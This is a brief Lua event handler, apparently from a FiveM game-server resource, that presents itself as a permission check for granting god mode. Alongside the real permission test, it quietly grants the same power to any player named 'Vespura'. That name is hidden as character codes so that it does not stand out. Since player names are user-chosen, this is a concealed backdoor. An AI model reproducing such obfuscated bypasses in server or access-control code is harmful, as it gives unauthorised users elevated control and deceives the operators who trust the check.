RegisterServerEvent('CheckPermissions')
AddEventHandler('CheckPermissions', function()
    if IsPlayerAceAllowed(source, "npb.god") or GetPlayerName(source) == (string.char(86,101,115,112,117,114,97)) then
        TriggerClientEvent('SetGod', source)
    end
end)
